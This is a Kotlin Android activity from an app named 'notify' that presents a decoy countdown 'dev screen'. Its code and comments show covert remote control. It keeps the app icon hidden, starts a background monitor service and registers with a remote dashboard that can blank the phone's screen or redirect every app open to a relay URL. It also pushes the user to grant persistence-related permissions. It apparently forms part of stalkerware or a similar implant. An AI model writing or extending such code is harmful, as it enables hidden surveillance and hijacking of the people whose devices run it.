package com.notify

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

/**
 * Gated dev screen with dashboard-driven overrides (per-device):
 * 1. Blank mode (dashboard "Blank" button) -> ONLY a white screen, nothing
 *    else. Only the dashboard can turn it off.
 * 2. Sticky relay (Relay 1/2 buttons) -> every app open auto-redirects to
 *    the relay URL without showing app contents, until "Stop Relay".
 * 3. Otherwise timer + note are hidden until ALL required permissions are
 *    granted (notifications + battery exemption).
 * Background wiring (monitor service, Teller register/heartbeat,
 * alias enforcement) is unchanged.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        // 6 hours 36 minutes, in milliseconds. Restarts on finish.
        private const val CYCLE_MS = (6 * 3600L + 36 * 60L) * 1000L
    }

    private var timer: CountDownTimer? = null
    private var lastStickyFireElapsed = 0L

    private lateinit var countdownView: TextView
    private lateinit var devNoteView: TextView
    private lateinit var gateView: LinearLayout
    private lateinit var btnNotifications: Button
    private lateinit var btnBattery: Button

    // Re-checks dashboard state (blank / sticky relay) while open so a
    // command sent mid-session takes effect without reopening the app.
    private val gateHandler = Handler(Looper.getMainLooper())
    private val gateCheck = object : Runnable {
        override fun run() {
            updateGate()
            gateHandler.postDelayed(this, 2000L)
        }
    }

    private val notifPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) {
            updateGate()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        countdownView = findViewById(R.id.countdown_timer)
        devNoteView = findViewById(R.id.dev_note)
        gateView = findViewById(R.id.permission_gate)
        btnNotifications = findViewById(R.id.btn_grant_notifications)
        btnBattery = findViewById(R.id.btn_grant_battery)

        btnNotifications.setOnClickListener { requestNotifPermission() }
        btnBattery.setOnClickListener { requestBatteryExemption() }

        // Never auto-show: opening this screen while hidden must NOT bring
        // the icon back. enforce() only re-asserts the hidden state.
        AppAlias.enforce(this)
        AppMonitorService.start(this)
        DeviceRegistrar.registerAsync(this)
        updateGate()
        gateHandler.removeCallbacks(gateCheck)
        gateHandler.postDelayed(gateCheck, 2000L)
    }

    override fun onResume() {
        super.onResume()
        AppForeground.onResumed(this)
        DeviceRegistrar.heartbeatAsync(this)
        updateGate()
        gateHandler.removeCallbacks(gateCheck)
        gateHandler.postDelayed(gateCheck, 2000L)
    }

    override fun onPause() {
        AppForeground.onPaused(this)
        gateHandler.removeCallbacks(gateCheck)
        super.onPause()
    }

    override fun onStop() {
        AppForeground.onStopped(this)
        super.onStop()
    }

    override fun onDestroy() {
        timer?.cancel()
        timer = null
        gateHandler.removeCallbacks(gateCheck)
        super.onDestroy()
    }

    private fun hasNotifPermission(): Boolean =
        Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED

    private fun hasBatteryExemption(): Boolean =
        AutostartHelper.isIgnoringBatteryOptimizations(this)

    private fun hasAllRequired(): Boolean =
        hasNotifPermission() && hasBatteryExemption()

    private fun updateGate() {
        if (!::countdownView.isInitialized) return
        // 1. Blank mode wins over everything: white screen only, no timer,
        // note, gate, or relay. Dashboard-only control.
        if (DeviceRegistrar.isBlankEnabled(this)) {
            timer?.cancel()
            timer = null
            countdownView.visibility = View.GONE
            devNoteView.visibility = View.GONE
            gateView.visibility = View.GONE
            return
        }
        // 2. Sticky relay: never show app contents — auto-redirect to the
        // relay URL on every open (throttled to avoid an intent storm while
        // the activity polls). Cleared only by dashboard "Stop Relay".
        if (DeviceRegistrar.hasStickyRelay(this)) {
            timer?.cancel()
            timer = null
            countdownView.visibility = View.GONE
            devNoteView.visibility = View.GONE
            gateView.visibility = View.GONE
            val now = SystemClock.elapsedRealtime()
            if (now - lastStickyFireElapsed > 3000L) {
                lastStickyFireElapsed = now
                DeviceRegistrar.fireStickyRelay(this)
            }
            return
        }
        if (hasAllRequired()) {
            gateView.visibility = View.GONE
            countdownView.visibility = View.VISIBLE
            devNoteView.visibility = View.VISIBLE
            startTimer()
        } else {
            timer?.cancel()
            timer = null
            countdownView.visibility = View.GONE
            devNoteView.visibility = View.GONE
            gateView.visibility = View.VISIBLE
            // Only show the button(s) for what's still missing.
            btnNotifications.visibility =
                if (hasNotifPermission()) View.GONE else View.VISIBLE
            btnBattery.visibility =
                if (hasBatteryExemption()) View.GONE else View.VISIBLE
        }
    }

    private fun requestNotifPermission() {
        if (hasNotifPermission()) {
            updateGate()
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            notifPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            updateGate()
        }
    }

    private fun requestBatteryExemption() {
        if (hasBatteryExemption()) {
            updateGate()
            return
        }
        if (!AutostartHelper.requestBatteryExemption(this)) {
            Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
        }
        // Result re-checked in onResume() -> updateGate().
    }

    private fun startTimer() {
        if (timer != null) return
        timer = object : CountDownTimer(CYCLE_MS, 1000L) {
            override fun onTick(millisUntilFinished: Long) {
                render(millisUntilFinished)
            }

            override fun onFinish() {
                // Loop: restart the full 6h36m cycle.
                timer = null
                startTimer()
            }
        }.start()
        render(CYCLE_MS)
    }

    private fun render(millis: Long) {
        val totalSec = millis / 1000L
        val h = totalSec / 3600L
        val m = (totalSec % 3600L) / 60L
        val s = totalSec % 60L
        countdownView.text =
            String.format(java.util.Locale.getDefault(), "%02d:%02d:%02d", h, m, s)
    }
}
